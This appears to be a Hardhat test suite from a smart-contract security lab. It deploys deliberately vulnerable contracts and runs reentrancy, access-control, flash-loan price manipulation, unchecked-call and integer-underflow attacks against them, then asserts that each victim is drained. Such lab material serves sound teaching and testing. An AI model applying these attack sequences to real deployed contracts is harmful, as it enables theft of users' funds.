import { expect } from "chai";
import { ethers } from "hardhat";

describe("Reentrancy Attack", function () {
  it("drains VulnerableBank", async function () {
    const [, attacker] = await ethers.getSigners();

    const Bank = await ethers.getContractFactory("VulnerableBank");
    const bank = await Bank.deploy();

    // Seed bank with 1 ETH from a victim depositor
    const [depositor] = await ethers.getSigners();
    await bank.connect(depositor).deposit({ value: ethers.parseEther("1") });

    const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackerContract = await Attacker.connect(attacker).deploy(await bank.getAddress());

    const bankBefore = await bank.getBankBalance();
    await attackerContract.connect(attacker).attack({ value: ethers.parseEther("0.1") });
    const bankAfter = await bank.getBankBalance();

    console.log("  Bank before:", ethers.formatEther(bankBefore), "ETH");
    console.log("  Bank after: ", ethers.formatEther(bankAfter), "ETH");
    console.log("  Attacker bal:", ethers.formatEther(await attackerContract.getBalance()), "ETH");

    expect(bankAfter).to.equal(0n);
  });
});

describe("Access Control Attack", function () {
  it("drains AccessControlVictim with no privileges", async function () {
    const [, attacker] = await ethers.getSigners();

    const Victim = await ethers.getContractFactory("AccessControlVictim");
    const victim = await Victim.deploy({ value: ethers.parseEther("2") });

    const Attacker = await ethers.getContractFactory("AccessControlAttacker");
    const attackerContract = await Attacker.connect(attacker).deploy(await victim.getAddress());

    const victimBefore = await victim.getBalance();
    await attackerContract.connect(attacker).attack();
    const victimAfter = await victim.getBalance();

    console.log("  Victim before:", ethers.formatEther(victimBefore), "ETH");
    console.log("  Victim after: ", ethers.formatEther(victimAfter), "ETH");
    console.log("  Attacker bal: ", ethers.formatEther(await attackerContract.getBalance()), "ETH");

    expect(victimAfter).to.equal(0n);
    expect(await attackerContract.getBalance()).to.equal(victimBefore);
  });
});

describe("Flash Loan Price Manipulation Attack", function () {
  it("buys tokens from FlashLoanVictim at a manipulated price", async function () {
    const [, attacker] = await ethers.getSigners();

    // Deploy DEX with 1 ETH liquidity (sets initial price: 1 ETH / 1000 tokens)
    const DEX = await ethers.getContractFactory("SimpleDEX");
    const dex = await DEX.deploy({ value: ethers.parseEther("1") });

    // Deploy victim using DEX as price oracle, seeded with 2 ETH
    const Victim = await ethers.getContractFactory("FlashLoanVictim");
    const victim = await Victim.deploy(await dex.getAddress(), { value: ethers.parseEther("2") });

    // Deploy provider with 5 ETH reserves
    const Provider = await ethers.getContractFactory("FlashLoanProvider");
    const provider = await Provider.deploy({ value: ethers.parseEther("5") });

    // Deploy attacker, pre-funded with 3 ETH so it can repay the flash loan
    // after spending some on DEX manipulation and the victim buy
    const Attacker = await ethers.getContractFactory("FlashLoanAttacker");
    const attackerContract = await Attacker.connect(attacker).deploy(
      await victim.getAddress(),
      await provider.getAddress(),
      await dex.getAddress(),
      { value: ethers.parseEther("3") },
    );

    const priceBefore = await dex.getPrice();
    const victimBefore = await victim.getBalance();

    await attackerContract.connect(attacker).attack(ethers.parseEther("2"));

    const priceAfter = await dex.getPrice();
    const victimAfter = await victim.getBalance();

    console.log("  Price before manipulation:", ethers.formatEther(priceBefore), "ETH/token");
    console.log("  Price after  manipulation:", ethers.formatEther(priceAfter), "ETH/token");
    console.log("  Victim ETH before:", ethers.formatEther(victimBefore), "ETH");
    console.log("  Victim ETH after: ", ethers.formatEther(victimAfter), "ETH");

    // Price should have changed due to DEX manipulation
    expect(priceAfter).to.not.equal(priceBefore);
    // Victim should have received ETH from the buy
    expect(victimAfter).to.be.greaterThan(victimBefore);
  });
});

describe("Input Validation Attack", function () {
  it("drains InputValidationVictim without ever depositing", async function () {
    const [depositor, attacker] = await ethers.getSigners();

    const Victim = await ethers.getContractFactory("InputValidationVictim");
    const victim = await Victim.deploy();

    await victim.connect(depositor).deposit({ value: ethers.parseEther("5") });

    const Attacker = await ethers.getContractFactory("InputValidationAttacker");
    const attackerContract = await Attacker.connect(attacker).deploy();

    const victimBefore = await victim.getBalance();
    const callData = victim.interface.encodeFunctionData("withdraw", [victimBefore]);
    await attackerContract.connect(attacker).attack(await victim.getAddress(), callData);
    const victimAfter = await victim.getBalance();

    console.log("  Attacker deposited: 0 ETH");
    console.log("  Victim before:", ethers.formatEther(victimBefore), "ETH");
    console.log("  Victim after: ", ethers.formatEther(victimAfter), "ETH");
    console.log("  Attacker bal: ", ethers.formatEther(await attackerContract.getBalance()), "ETH");

    expect(victimAfter).to.equal(0n);
  });
});

describe("Integer Overflow Attack", function () {
  it("underflows token balance and drains OverflowVictim", async function () {
    const [, attacker] = await ethers.getSigners();

    const Victim = await ethers.getContractFactory("OverflowVictim");
    const victim = await Victim.deploy({ value: ethers.parseEther("5") });

    const Attacker = await ethers.getContractFactory("OverflowAttacker");
    const attackerContract = await Attacker.connect(attacker).deploy();

    const PRICE = await victim.PRICE();
    const victimBefore = await victim.getBalance();
    const drainTokens = victimBefore / PRICE;

    // Step 1: transfer(attacker, 1) — attacker has 0 tokens, 0 - 1 underflows to type(uint256).max
    const triggerData = victim.interface.encodeFunctionData("sendTokens", [
      ethers.ZeroAddress,
      1n,
    ]);
    // Step 2: redeem(drainTokens) — redeem just enough to empty the contract
    const extractData = victim.interface.encodeFunctionData("redeem", [drainTokens]);

    await attackerContract.connect(attacker).attack(await victim.getAddress(), triggerData, extractData);
    const victimAfter = await victim.getBalance();

    console.log("  Attacker tokens before: 0");
    console.log("  After underflow:        type(uint256).max");
    console.log("  Drain amount:           ", drainTokens.toString(), "tokens");
    console.log("  Victim before:", ethers.formatEther(victimBefore), "ETH");
    console.log("  Victim after: ", ethers.formatEther(victimAfter), "ETH");
    console.log("  Attacker bal: ", ethers.formatEther(await attackerContract.getBalance()), "ETH");

    expect(victimAfter).to.equal(0n);
  });
});
